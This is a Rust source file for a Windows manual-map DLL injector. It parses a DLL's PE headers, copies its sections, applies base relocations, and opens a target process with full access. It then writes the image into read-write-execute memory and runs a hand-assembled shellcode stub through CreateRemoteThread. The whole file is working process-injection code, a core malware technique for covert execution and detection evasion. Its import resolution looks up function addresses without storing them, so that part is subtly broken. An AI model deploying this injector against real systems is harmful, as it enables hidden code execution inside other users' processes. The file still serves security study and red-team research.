use std::{ptr::{null_mut}, intrinsics::{copy_nonoverlapping, transmute}, ffi::c_void, io};
use winapi::{um::{processthreadsapi::{OpenProcess, CreateRemoteThread}, winnt::{PROCESS_ALL_ACCESS, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, PIMAGE_NT_HEADERS64, PIMAGE_SECTION_HEADER, IMAGE_NT_SIGNATURE, IMAGE_DOS_SIGNATURE, PIMAGE_DOS_HEADER, PIMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, IMAGE_DIRECTORY_ENTRY_IMPORT, PIMAGE_THUNK_DATA64, PIMAGE_IMPORT_BY_NAME, PIMAGE_IMPORT_DESCRIPTOR}, errhandlingapi::GetLastError, memoryapi::{VirtualAllocEx, WriteProcessMemory}, libloaderapi::{LoadLibraryA, GetProcAddress}, synchapi::WaitForSingleObject, handleapi::CloseHandle}, shared::minwindef::FALSE};


pub fn manual_map(dll_bytes: &[u8], process_id: u32) {
    let (dos_header, nt_headers) = get_image_nt_and_dos_headers(dll_bytes.as_ptr());
    println!("[+] _IMAGE_DOS_HEADER: {:p} _IMAGE_NT_HEADERS64: {:p}", dos_header, nt_headers);

    let local_image = copy_sections_to_local_process(nt_headers, dll_bytes.as_ptr());
    println!("[+] Local allocated memory region: {:p}", local_image.as_ptr());

    let process_handle = unsafe { 
        OpenProcess(
            PROCESS_ALL_ACCESS,
            FALSE,
            process_id
        )
    };

    if process_handle == null_mut() {
        error("Failed to open the target process");
    }

    println!("[+] Process handle: {:?}", process_handle);

    let remote_image = unsafe { 
        VirtualAllocEx(
            process_handle,
            null_mut(),
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
    };

    if remote_image == null_mut() {
        error("Failed to allocate memory in the target process for dll");
    }
    
    println!("[+] Remote allocated memory region for the dll: {:p}", remote_image);

    unsafe { rebase_image(nt_headers, local_image.as_ptr(), remote_image) };
    unsafe { resolve_imports(nt_headers, local_image.as_ptr()) };

    let wpm_result = unsafe {
        WriteProcessMemory(
            process_handle,
            remote_image as _,
            local_image.as_ptr() as _,
            local_image.len(),
            null_mut(),
        )
    };

    if wpm_result == 0 {
        error("Failed to write the local image to the target process");
    }

    let entry_point = unsafe { remote_image as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize };

    println!("Entry Point: {:#x}", entry_point);
    pause();

    unsafe { call_entrypoint(remote_image as usize, entry_point, process_handle) };

    unsafe { CloseHandle(process_handle) };
}

unsafe fn call_entrypoint(image_base: usize, entrypoint: usize, process_handle: *mut c_void) {
    
    #[rustfmt::skip]
    let mut shellcode: Vec<u8> = vec![
        0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 28h
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, image_base  ; hinstDLL
        0x48, 0xc7, 0xc2, 0x01, 0x00, 0x00, 0x00,                   // mov rdx, 1           ; fdwReason
        0x4d, 0x31, 0xC0,                                           // xor r8, r8           ; lpvReserved
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, entrypoint
        0xFF, 0xD0,                                                 // call rax
        0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 28h
        0xC3,                                                       // ret
    ];

    (shellcode.as_mut_ptr().offset(6) as *mut u64).write_volatile(image_base as u64);
    (shellcode.as_mut_ptr().offset(26) as *mut u64).write_volatile(entrypoint as u64);

    let shellcode_memory = VirtualAllocEx(
        process_handle,
        null_mut(),
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if shellcode_memory == null_mut() {
        error("Failed to allocate memory in the target process for the shellcode");
    }
    
    println!("[+] Remote allocated memory region for shellcode: {:p}", shellcode_memory);

    let wpm_result = WriteProcessMemory(
        process_handle,
        shellcode_memory as _,
        shellcode.as_ptr() as _,
        shellcode.len(),
        null_mut(),
    );

    if wpm_result == 0 {
        error("Failed to write shellcode to the target process");
    }

    pause();

    let thread_handle = CreateRemoteThread(
        process_handle,
        null_mut(),
        0,
        Some(std::mem::transmute(shellcode_memory as usize)),
        null_mut(),
        0,
        null_mut(),
    );

    if thread_handle == null_mut() {
        error("Failed to create remote thread");
    }

    WaitForSingleObject(thread_handle, 0xFFFFFFFF);
}

// Resolve the local image imports
unsafe fn resolve_imports(nt_headers: PIMAGE_NT_HEADERS64, local_image: *const u8) {
     // Resolve imports
     let mut current_import_descriptor = (local_image as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize) as PIMAGE_IMPORT_DESCRIPTOR;

     while (*current_import_descriptor).FirstThunk != 0 {
         //let name = CStr::from_ptr((executable_image as usize + (*current_import_descriptor).Name as usize) as *const i8).to_str().expect("Couldn't convert to str").to_string();
         let dll_name = (local_image as usize + (*current_import_descriptor).Name as usize) as *const i8;
         let dll_handle = LoadLibraryA(dll_name);
 
         //let mut current_first_thunk = (executable_image as usize + (*current_import_descriptor).FirstThunk as usize) as PIMAGE_THUNK_DATA64;
         
         let mut current_original_first_thunk = (local_image as usize + *(*current_import_descriptor).u.OriginalFirstThunk() as usize) as PIMAGE_THUNK_DATA64;
 
         while (*(*current_original_first_thunk).u1.Function()) != 0 {
             let thunk_data = (local_image as usize + *(*current_original_first_thunk).u1.AddressOfData() as usize) as PIMAGE_IMPORT_BY_NAME;
             
             //let function_name = CStr::from_ptr((*thunk_data).Name.as_ptr()).to_str().expect("couldn't convert to str").to_string();
             let function_name = (*thunk_data).Name.as_ptr();

             GetProcAddress(dll_handle, function_name);
             //let function_address = (*current_first_thunk).u1.Function_mut() as *mut u64 as usize;
             current_original_first_thunk = (current_original_first_thunk as usize + std::mem::size_of::<PIMAGE_THUNK_DATA64>()) as PIMAGE_THUNK_DATA64;
             //current_first_thunk = (current_first_thunk as usize + std::mem::size_of::<PIMAGE_THUNK_DATA64>()) as PIMAGE_THUNK_DATA64;
         }
 
         current_import_descriptor = (current_import_descriptor as usize + std::mem::size_of::<PIMAGE_IMPORT_DESCRIPTOR>()) as PIMAGE_IMPORT_DESCRIPTOR;
     }
}

// Rebase the local image
unsafe fn rebase_image(nt_headers: PIMAGE_NT_HEADERS64, local_image: *const u8, remote_image: *mut c_void) {
    
    let mut current_base_relocation = transmute::<usize, PIMAGE_BASE_RELOCATION>(local_image as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize);
    let relocation_end = current_base_relocation as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].Size as usize;
    let delta = remote_image as isize - (*nt_headers).OptionalHeader.ImageBase as isize;

    //delete later
    if delta == 0 {
        println!("[*] No rebasing necessary");
    }
    
    while (*current_base_relocation).VirtualAddress != 0u32 && (*current_base_relocation).VirtualAddress as usize <= relocation_end && (*current_base_relocation).SizeOfBlock != 0u32 {
        let address = (local_image as usize + (*current_base_relocation).VirtualAddress as usize) as isize;
        let item = transmute::<usize, *const u16>(current_base_relocation as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>());
        let count = ((*current_base_relocation).SizeOfBlock as usize - std::mem::size_of::<IMAGE_BASE_RELOCATION>()) / std::mem::size_of::<u16>() as usize;

        for i in 0..count {
            let type_field = item.offset(i as isize).read() >> 12;
            let offset = item.offset(i as isize).read() & 0xFFF;

            if type_field == IMAGE_REL_BASED_DIR64 {
                //let mut relocate_me = *((address + offset as isize) as *mut isize);
                //relocate_me = delta + relocate_me;
                *((address + offset as isize) as *mut isize) += delta;
            }
        }

        current_base_relocation = transmute::<usize, PIMAGE_BASE_RELOCATION>(current_base_relocation as usize + (*current_base_relocation).SizeOfBlock as usize);
    }
}

// Copy sections of the dll to the target process
fn copy_sections_to_local_process(nt_headers: PIMAGE_NT_HEADERS64, dll_bytes: *const u8) -> Vec<u8> {
    
    let image_size = unsafe { (*nt_headers).OptionalHeader.SizeOfImage } as usize ;
    let mut image = vec![0; image_size];

    let section_header = unsafe { 
        transmute::<usize, PIMAGE_SECTION_HEADER>(&(*nt_headers).OptionalHeader as *const _ as usize + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize)
    };

    println!("[+] IMAGE_SECTION_HEADER: {:p}", section_header);

    for i in unsafe { 0..(*nt_headers).FileHeader.NumberOfSections } {
        let section_header_i = unsafe { &*(section_header.add(i as usize)) };
        //println!("Section: {:p}", section_header_i);
        
        let destination = unsafe { image.as_mut_ptr().offset(section_header_i.VirtualAddress as isize) };
        let source = dll_bytes as usize + section_header_i.PointerToRawData as usize;
        let size = section_header_i.SizeOfRawData as usize;

        //println!("[+] Section source: {:#x} and Section destination: {:#p}", source, destination);
        // copy section headers into the local process
        unsafe { 
            copy_nonoverlapping(
                source as *const c_void,
                destination as *mut _,
                size,
            )
        };
    }

    image
}

// Get IMAGE_NT_HEADERS of the image base address
fn get_image_nt_and_dos_headers(image_base: *const u8) -> (PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS64) {
    unsafe {
        let dos_header = transmute::<_, PIMAGE_DOS_HEADER>(image_base);

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            panic!("[-] Failed to get IMAGE_DOS_HEADER");
        }

        let nt_headers = transmute::<usize, PIMAGE_NT_HEADERS64>(
            image_base as usize + (*dos_header).e_lfanew as usize,
        );

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            panic!("[-] Failed to get IMAGE_NT_HEADERS");
        }
        
        (dos_header, nt_headers)
    }
}

// Panic and print GetLastError
fn error(text: &str){
    panic!("[-] {} {}", text, unsafe { GetLastError()});
}

#[allow(dead_code)]
// Gets user input from the terminal
fn get_input() -> io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
// Used for debugging
fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}